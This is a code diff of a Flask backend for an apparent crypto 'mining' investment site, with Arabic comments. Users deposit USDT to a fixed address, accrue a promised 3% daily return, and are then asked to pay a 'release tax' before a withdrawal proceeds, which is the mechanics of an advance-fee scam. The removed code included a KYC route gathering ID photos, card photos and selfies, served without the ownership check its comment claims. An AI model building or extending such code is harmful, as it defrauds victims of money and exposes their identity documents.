@@ -1,44 +1,19 @@
-import os, sys, hashlib, secrets, traceback
+import os, hashlib, secrets
 from datetime import datetime, timedelta
 from flask import Flask, request, session, redirect, url_for, render_template, g, flash
-import admin_secure
+import db as dbmod
+from sqlalchemy import text
 
 APP_DIR = os.path.dirname(os.path.abspath(__file__))
-UPLOAD_FOLDER = os.path.join(APP_DIR, "uploads")
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-app_max = 16 * 1024 * 1024
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
-app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
 
-STARTUP_ERROR = "none"
-
-# ----- تشخيص: نمسك كل خطأ -----
+# تهيئة قاعدة البيانات
 try:
-    import db as dbmod
-    from sqlalchemy import text
-    print("[+] imports OK")
-    try:
-        dbmod.init_db()
-        print("[+] DB initialized")
-    except Exception as e:
-        STARTUP_ERROR = "DB INIT: " + traceback.format_exc()
-        print("[!] DB INIT FAIL:", e)
+    dbmod.init_db()
+    print("[+] Database initialized")
 except Exception as e:
-    STARTUP_ERROR = "IMPORT: " + traceback.format_exc()
-    print("[!] IMPORT FAIL:", e)
-
-# صفحة الفحص — تعرض الحالة
-@app.route("/_diag")
-def diag():
-    return "<pre style='color:red;background:#fff;padding:20px;font-size:12px;direction:ltr'>STARTUP_ERROR:\n\n" + str(STARTUP_ERROR) + "</pre>"
-
-# نلتقط أي خطأ في أي صفحة
-@app.errorhandler(Exception)
-def catch_all(e):
-    tb = traceback.format_exc()
-    return "<pre style='color:red;background:#fff;padding:20px;font-size:11px;direction:ltr'>" + tb + "</pre>", 200
+    print("[!] DB init failed:", e)
 
 DEPOSIT_ADDR = "TXk9ApexMiningUSDTx9K2VrQp"
 DAILY_RATE   = 0.03
@@ -103,20 +78,6 @@ def _fetchone(result):
 
 def _fetchall(result):
     return [_RowLike(_row_to_dict(r)) for r in result.fetchall()]
-
-def get_client_ip():
-    return request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
-
-def log_activity(user_id, action, detail=""):
-    try:
-        db = get_db()
-        db.execute(
-            "INSERT INTO activity (user_id, action, detail, ip, ua) VALUES (?,?,?,?,?)",
-            (user_id, action, detail, get_client_ip(), request.headers.get("User-Agent","")[:300])
-        )
-        db.commit()
-    except Exception:
-        pass
 
 def h(p): return hashlib.sha256(p.encode()).hexdigest()
 
@@ -262,9 +223,9 @@ def register():
             flash("Email already registered. Please login.", "err")
             return redirect(url_for("login"))
         code = "APX" + secrets.token_hex(3).upper()
-        db.execute("""INSERT INTO users (email,password,full_name,country,balance,bonus,referral_code,referred_by,last_profit,ip)
-                      VALUES (?,?,?,?,?,?,?,?,?,?)""",
-                   (email, h(pw), name, country, 0, 10.0, code, ref or None, datetime.utcnow().isoformat(), get_client_ip()))
+        db.execute("""INSERT INTO users (email,password,full_name,country,balance,bonus,referral_code,referred_by,last_profit)
+                      VALUES (?,?,?,?,?,?,?,?,?)""",
+                   (email, h(pw), name, country, 0, 10.0, code, ref or None, datetime.utcnow().isoformat()))
         db.commit()
         uid = db.execute("SELECT id FROM users WHERE email=?", (email,)).fetchone()["id"]
         session["uid"] = uid
@@ -280,7 +241,6 @@ def login():
         row = get_db().execute("SELECT * FROM users WHERE email=? AND password=?", (email, h(pw))).fetchone()
         if row:
             session["uid"] = row["id"]
-            log_activity(row["id"], "login", "")
             return redirect(url_for("dashboard"))
         flash("Invalid email or password.", "err")
     return render_template("login.html", **ctx())
@@ -333,9 +293,8 @@ def deposit():
     try: amt = float(request.form["amount"])
     except: flash("Invalid amount.", "err"); return redirect(url_for("dashboard"))
     db = get_db()
-    db.execute("INSERT INTO deposits (user_id,amount,method,address,status,ip) VALUES (?,?,?,?, 'pending',?)",
-               (user["id"], amt, request.form.get("method","USDT-TRC20"), DEPOSIT_ADDR, get_client_ip()))
-    log_activity(user["id"], "deposit_requested", f"${amt}")
+    db.execute("INSERT INTO deposits (user_id,amount,method,address,status) VALUES (?,?,?,?, 'pending')",
+               (user["id"], amt, request.form.get("method","USDT-TRC20"), DEPOSIT_ADDR))
     db.commit()
     flash("Deposit submitted. Awaiting network confirmation (1-3 hours).", "ok")
     return redirect(url_for("dashboard"))
@@ -350,9 +309,8 @@ def withdraw():
     if amt > (user["balance"] or 0): flash("Insufficient balance.", "err"); return redirect(url_for("dashboard"))
     tax = round(amt*TAX_RATE, 2)
     db = get_db()
-    db.execute("INSERT INTO withdrawals (user_id,amount,tax,wallet,status,ip) VALUES (?,?,?,?, 'pending',?)",
-               (user["id"], amt, tax, request.form.get("wallet",""), get_client_ip()))
-    log_activity(user["id"], "withdrawal_requested", f"${amt}")
+    db.execute("INSERT INTO withdrawals (user_id,amount,tax,wallet,status) VALUES (?,?,?,?, 'pending')",
+               (user["id"], amt, tax, request.form.get("wallet","")))
     db.commit()
     flash(f"Withdrawal recorded. Please pay the release tax to continue.", "ok")
     return redirect(url_for("withdraw_tax"))
@@ -378,40 +336,6 @@ def withdraw_confirm_tax():
     db.commit()
     flash("Tax payment submitted. Your withdrawal is being processed by our compliance team.", "ok")
     return redirect(url_for("dashboard"))
-
-
-# ================== KYC ==================
-@app.route("/kyc", methods=["GET", "POST"])
-def kyc():
-    user = current_user()
-    if not user: return redirect(url_for("login"))
-    if request.method == "POST":
-        db = get_db()
-        saved = 0
-        for field in ["id_photo", "card_photo", "selfie"]:
-            f = request.files.get(field)
-            if f and f.filename:
-                ext = f.filename.rsplit(".", 1)[-1].lower() if "." in f.filename else "bin"
-                if ext not in ("jpg","jpeg","png","webp","pdf"): ext = "bin"
-                fname = f"{user['id']}_{field}_{secrets.token_hex(6)}.{ext}"
-                f.save(os.path.join(UPLOAD_FOLDER, fname))
-                db.execute("INSERT INTO uploads (user_id, kind, filename, ip) VALUES (?,?,?,?)",
-                           (user["id"], field, fname, get_client_ip()))
-                saved += 1
-        db.execute("UPDATE users SET kyc=1 WHERE id=?", (user["id"],))
-        db.commit()
-        log_activity(user["id"], "kyc_submitted", f"{saved} files")
-        flash(f"KYC submitted ({saved} files). Verification in progress.", "ok")
-        return redirect(url_for("dashboard"))
-    return render_template("kyc.html", user=user)
-
-@app.route("/uploads/<path:filename>")
-def serve_upload(filename):
-    user = current_user()
-    if not user: return redirect(url_for("login"))
-    # اسمح فقط للمالك أو الأدمن
-    from flask import send_from_directory
-    return send_from_directory(UPLOAD_FOLDER, filename)
 
 # ================== ADMIN ==================
 @app.route("/admin")
@@ -457,9 +381,6 @@ def admin_wd(wid, action):
 @app.errorhandler(404)
 def not_found(e):
     return render_template("404.html", **ctx()), 404
-
-# ================== SECURE ADMIN ==================
-admin_secure.build_admin_routes(app, get_db)
 
 if __name__ == "__main__":
     if not os.path.exists(DB):
